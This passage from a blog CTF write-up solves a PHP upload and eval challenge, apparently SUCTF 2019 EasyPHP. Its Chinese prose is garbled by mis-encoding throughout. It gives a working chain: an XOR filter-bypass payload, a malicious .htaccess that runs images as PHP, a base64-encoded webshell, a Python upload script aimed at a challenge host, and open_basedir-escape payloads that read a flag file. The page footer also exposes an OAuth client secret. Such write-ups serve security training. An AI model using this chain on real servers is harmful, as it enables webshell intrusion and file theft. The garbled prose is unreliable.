<h4 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h4><p><strong>å…³äºè§£æ</strong><br>ä¹‹å‰è®²è¿‡ä¸€ä¸ªå€Ÿç”¨<code>.user.ini</code>è§£ææ¥ä¸Šä¼ å°é©¬çš„ï¼Œè¿™é‡Œå†æ‰©å±•ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>nginxçš„æœåŠ¡å™¨ï¼Œè€Œä¸”ä¸Šä¼ ç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæ‰€ä»¥ä¸Šä¼ .user.ini<br>apacheçš„æœåŠ¡å™¨ï¼Œåº”è¯¥ä¸Šä¼ .htaccess</p>
</blockquote>
<p><code>.user.ini</code>çš„å·²ç»è®²è¿‡äº†ï¼Œè¿™é‡Œè®²ä¸€ä¸‹<code>.htaccess</code>ï¼šä¸Šä¼ çš„æ—¶å€™ä¸èƒ½ç”¨<code>GIF89a</code>ç­‰æ–‡ä»¶å¤´å»ç»•è¿‡<code>exif_imagetype</code>,å› ä¸ºè¿™æ ·è™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†<code>.htaccess</code>æ–‡ä»¶æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ—¶æœ‰ä¸¤ä¸ªåŠæ³•:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>
<p><code>#</code>åœ¨<code>.htaccess</code>æ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥<code>.htaccess</code>æ–‡ä»¶å¯ä»¥ç”Ÿæ•ˆã€‚åŒæ—¶åœ¨<code>.htaccess</code>å‰æ·»åŠ <code>x00x00x8ax39x8ax39</code>(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨<code>python</code>çš„<code>bytes</code>ç±»å‹)ï¼Œè¿™é‡Œ<code>x00x00x8ax39x8ax39</code>æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œ<code>.htaccess</code>ä¸­ä»¥<code>0x00</code>å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“<code>.htaccess</code>ã€‚<br><strong>å¯¹&lt;?è¿‡æ»¤çš„ç»•è¿‡</strong><br>å¯¹<code>&lt;?</code>ç»•è¿‡çš„ä¸€èˆ¬å¯ä»¥å€Ÿç”¨<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>æ¥ç»•è¿‡ï¼Œä½†æ˜¯å½“PHPçš„ç‰ˆæœ¬æ˜¯<code>7</code>ä»¥ä¸Šçš„æ—¶å€™ï¼Œæœ¬æ–¹æ³•ä¸å¯ç”¨äº†ï¼Œæ­¤æ—¶éœ€è¦ç”¨å¦ä¸€ç§æ–¹æ³•ï¼š<strong>å¯ä»¥é€šè¿‡ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œå¦‚åŸæ¥ä½¿ç”¨utf-8ç¼–ç ï¼Œå¦‚æœshellä¸­æ˜¯ç”¨utf-16ç¼–ç åˆ™å¯ä»¥Bypass</strong>ã€‚<br>åœ¨æœ¬é¢˜ä¸­çš„ç”¨æ³•åé¢å†è®²ã€‚</p>
<h4 id="ç»•è¿‡open-basedir-disable-function"><a href="#ç»•è¿‡open-basedir-disable-function" class="headerlink" title="ç»•è¿‡open_basedir/disable_function"></a>ç»•è¿‡open_basedir/disable_function</h4><p><code>open_basedir</code>æ˜¯<code>php.ini</code>ä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå®ƒå¯å°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚<br>å‡è®¾<code>open_basedir=/home/wwwroot/home/web1/:/tmp/</code>ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†<code>/home/wwwroot/home/web1/</code>å’Œ<code>/tmp/</code>è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚<br>æ³¨æ„ç”¨<code>open_basedir</code>æŒ‡å®šçš„é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•åã€‚ä¸¾ä¾‹æ¥è¯´: è‹¥<code>open_basedir = /dir/user</code>, é‚£ä¹ˆç›®å½•<code>/dir/user</code>å’Œ<code>/dir/user1</code>éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œæ‰€ä»¥å¦‚æœè¦å°†è®¿é—®é™åˆ¶åœ¨ä»…ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œæ³¨æ„<strong>ç”¨æ–œçº¿ç»“æŸè·¯å¾„å</strong>ã€‚<br>æ›´å¤šçš„å¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/4720">è¿™é‡Œ</a>ã€‚</p>
<h3 id="è§£é¢˜-14"><a href="#è§£é¢˜-14" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®çœ‹åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ä¸»è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š<code>get_the_flag()</code>å’Œå„ç§è¿‡æ»¤çš„ä»£ç (ä¸»è¦æ˜¯ä¸ºäº†è°ƒç”¨<code>get_the_flag()</code>)ã€‚<br>å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„ä»£ç fuzzä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[x00- 0-9A-Za-z'</span><span class="string">"`~_&amp;.,|=[x7F]+/i', chr($i))) &#123;</span></span><br><span class="line"><span class="string">        echo urlencode(chr($i)).' ';</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è·å–åˆ°æ²¡æœ‰è¢«bançš„å­—ç¬¦ï¼š</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">! # $ % ( ) * + - / : ; <span class="tag">&lt; &gt;</span> ? @ ] ^ </span><span class="template-variable">&#123; &#125;</span></span><br></pre></td></tr></table></figure>
<p>å‚è€ƒå‰é¢è®²çš„æ‹¿webshellçš„ä¸‰ç§æ–¹æ³•ï¼Œè¿™é‡Œå–åç¬¦å·<code>~</code>ç›´æ¥è¢«ç¦æ‰äº†ï¼Œ<code>è‡ªå¢</code>éœ€è¦ç”¨åˆ°å˜é‡é•¿åº¦ä¼šå¾ˆé•¿,å› æ­¤å°è¯•ä½¿ç”¨<code>å¼‚æˆ–</code>ï¼Œå› ä¸ºæœ‰é•¿åº¦çš„é™åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥å»å‡‘å‡ºç±»ä¼¼<code>$_GET{x}();</code>ç„¶åä¼ å…¥<code>x=get_the_flag</code>è°ƒç”¨å‡½æ•°ã€‚<br>åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬æ¥æ„é€ ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°payloadï¼š</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">?_=$&#123;<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe^<span class="meta">%</span>a<span class="number">1</span><span class="meta">%</span>b<span class="number">9</span><span class="meta">%</span>bb<span class="meta">%</span>aa&#125;&#123;<span class="meta">%</span>fe&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>fe=get_the_flag</span><br></pre></td></tr></table></figure>
<p>å†çœ‹<code>get_the_flag</code>çš„ä»£ç ï¼Œå‘ç°æ˜¯ä¸€ä¸ªä¸Šä¼ ï¼Œä»ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¯¹<code>ph</code>ã€<code>&lt;?</code>ã€æ–‡ä»¶çš„ç±»å‹éƒ½åšäº†åˆ¤æ–­ã€‚<br>é‚£åªèƒ½ä¸Šä¼ å›¾ç‰‡é©¬äº†ï¼Œä½†æ˜¯è¿˜éœ€è¦ä¸Šä¼ è§£æå›¾ç‰‡é©¬çš„æ–‡ä»¶ï¼Œè¯¥é¢˜çš„ç¯å¢ƒæ˜¯<code>apache</code>ï¼Œå› æ­¤éœ€è¦ä¸Šä¼ <code>.htaccess</code>ï¼Œæ„é€ çš„æ–¹æ³•å‰é¢ä¹Ÿè®²è¿‡äº†ã€‚<br>ç°åœ¨è®²ä¸€ä¸‹<code>.htaccess</code>æ„é€ çš„å†…å®¹ï¼Œè¿™é‡Œå°†ä¸€å¥è¯è¿›è¡Œbase64ç¼–ç ï¼Œç„¶ååœ¨<code>.htaccess</code>ä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">#def</span>ine <span class="attribute">width</span> <span class="number">1337</span></span><br><span class="line"><span class="number">#def</span>ine <span class="attribute">height</span> <span class="number">1337</span> </span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg"</span></span><br></pre></td></tr></table></figure>
<p>shell.jpgå†…å®¹ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/<span class="attribute">Pg</span>==</span><br></pre></td></tr></table></figure>
<p>å‚è€ƒå¤§ä½¬çš„ä¸€ä¸ªå®Œæ•´çš„ä¸Šä¼ è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://300a73e6-9981-40dd-b39a-cdf1584e3ba2.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web72.png" alt=""><br>ç„¶åè®¿é—®<code>?a=phpinfo();</code>å‘ç°å­˜åœ¨<code>open_basedir</code>å’Œ<code>disable_functions</code>çš„é™åˆ¶ï¼Œå‚è€ƒå‰é¢è®²åˆ°çš„çŸ¥è¯†ï¼Œæ„é€ æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web73.png" alt=""><br>æ‰¾åˆ°flagæ–‡ä»¶<code>THis_Is_tHe_F14g</code>ï¼Œç„¶åæ„é€ payloadæ‹¿flagï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web74.png" alt=""><br>å¶ç„¶å‘ç°ï¼Œå…¶å®è¿™ä¸ªé¢˜ä¸å»ç»•è¿‡<code>open_basedir</code>å’Œ<code>disable_functions</code>çš„é™åˆ¶ï¼Œç›´æ¥è®¿é—®<code>phpinfo()</code>å°±æœ‰flagâ€¦<br><img src="http://www.ggb0n.cool/images/BUUCTF-web75.png" alt=""></p>
</div><ul class="post-copyright"><li><strong>Post Title: </strong><a href="http://ggb0n.cool/2020/02/10/BUUCTF-webåˆ·é¢˜â…¡/">BUUCTF-webåˆ·é¢˜â…¡</a></li><li><strong>Post Author: </strong><a href="http://ggb0n.cool">ggb0n</a></li><li><strong>Post Link: </strong><a href="http://ggb0n.cool/2020/02/10/BUUCTF-webåˆ·é¢˜â…¡/">http://ggb0n.cool/2020/02/10/BUUCTF-webåˆ·é¢˜â…¡/</a></li><li><strong>Copyright Notice: </strong><span>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></li></ul><div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â Related Post</span><br><span>Â Â 1.<a class="is-size-6" href="/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/" target="_blank">GWCTF2019å¤ç°</a><br></span><span>Â Â 2.<a class="is-size-6" href="/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/" target="_blank">BUUCTF-webåˆ·é¢˜â…¢</a><br></span><span>Â Â 3.<a class="is-size-6" href="/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/" target="_blank">BUUCTF-webåˆ·é¢˜â… </a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â Recommend Post</span><br><span>Â Â 1.<a class="is-size-6" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/" target="_blank">obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="http://ggb0n.cool/images/emFuc2hhbmc=.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">æå®¢å¤§æŒ‘æˆ˜é¢˜ç›®è§£æ</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/"><span class="level-item">BUUCTF-webåˆ·é¢˜â… </span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
            var gitalk = new Gitalk({
            id: '0bbf2509d2ebecfbaeffcd6931a678df',
            repo: 'blog_comment',
            owner: 'ggb0n',
            clientID: '0a75c84e24da4e774d10',
            clientSecret: '80c72733da730b019e5047ae6c7eff937914a4d9',
            admin: ["ggb0n"],
            createIssueManually: true,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: 'last',
            
            
            enableHotKey: true,
            isLocked: false
        })
        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-SUCTF-2019-Pythonginx" href="#SUCTF-2019-Pythonginx"><span>[SUCTF 2019]Pythonginx</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è€ƒå¯ŸçŸ¥è¯†" href="#è€ƒå¯ŸçŸ¥è¯†"><span>è€ƒå¯ŸçŸ¥è¯†</span></a></li><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ" href="#é¢˜ç›®åˆ†æ"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜" href="#è§£é¢˜"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-æå®¢å¤§æŒ‘æˆ˜-2019-Http" href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http"><span>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-1" href="#è§£é¢˜-1"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><span>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-1" href="#é¢˜ç›®åˆ†æ-1"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-2" href="#è§£é¢˜-2"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-SUCTF-2019-EasySQL" href="#SUCTF-2019-EasySQL"><span>[SUCTF 2019]EasySQL</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-2" href="#é¢˜ç›®åˆ†æ-2"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-3" href="#è§£é¢˜-3"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-BUUCTF-2018-Online-Tool" href="#BUUCTF-2018-Online-Tool"><span>[BUUCTF 2018]Online Tool</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-3" href="#é¢˜ç›®åˆ†æ-3"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-4" href="#è§£é¢˜-4"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-ZJCTF-2019-NiZhuanSiWei" href="#ZJCTF-2019-NiZhuanSiWei"><span>[ZJCTF 2019]NiZhuanSiWei</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-4" href="#é¢˜ç›®åˆ†æ-4"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-5" href="#è§£é¢˜-5"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><span>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-5" href="#é¢˜ç›®åˆ†æ-5"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-6" href="#è§£é¢˜-6"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><span>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è¡¥å……çŸ¥è¯†" href="#è¡¥å……çŸ¥è¯†"><span>è¡¥å……çŸ¥è¯†</span></a></li><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-6" href="#é¢˜ç›®åˆ†æ-6"><span>é¢˜ç›®åˆ†æ</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-CISCN-2019-ikun" href="#CISCN-2019-ikun"><span>[CISCN 2019]ikun</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-7" href="#é¢˜ç›®åˆ†æ-7"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-7" href="#è§£é¢˜-7"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-ASIS-2019-Unicorn-shop" href="#ASIS-2019-Unicorn-shop"><span>[ASIS 2019]Unicorn shop</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-8" href="#è§£é¢˜-8"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-WesternCTF-2018-shrine" href="#WesternCTF-2018-shrine"><span>[WesternCTF 2018]shrine</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-8" href="#é¢˜ç›®åˆ†æ-8"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-9" href="#è§£é¢˜-9"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-å®‰æ´µæ¯-2019-easy-web" href="#å®‰æ´µæ¯-2019-easy-web"><span>[å®‰æ´µæ¯ 2019]easy_web</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-9" href="#é¢˜ç›®åˆ†æ-9"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-10" href="#è§£é¢˜-10"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><span>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-11" href="#è§£é¢˜-11"><span>è§£é¢˜</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-CISCN-2019-Love-Math" href="#CISCN-2019-Love-Math"><span>[CISCN 2019]Love Math</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-è¡¥å……çŸ¥è¯†-1" href="#è¡¥å……çŸ¥è¯†-1"><span>è¡¥å……çŸ¥è¯†</span></a></li><li><a class="is-flex toc-item" id="toc-item-é¢˜ç›®åˆ†æ-10" href="#é¢˜ç›®åˆ†æ-10"><span>é¢˜ç›®åˆ†æ</span></a></li><li><a class="is-flex toc-item" id="toc-item-è§£é¢˜-12" href="#è§£é¢˜-12"><span>è§£é¢˜</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-åŠ å‚æ•°" href="#åŠ å‚æ•°"><span>åŠ å‚æ•°</span></a></li><li><a class="is-flex toc-item" 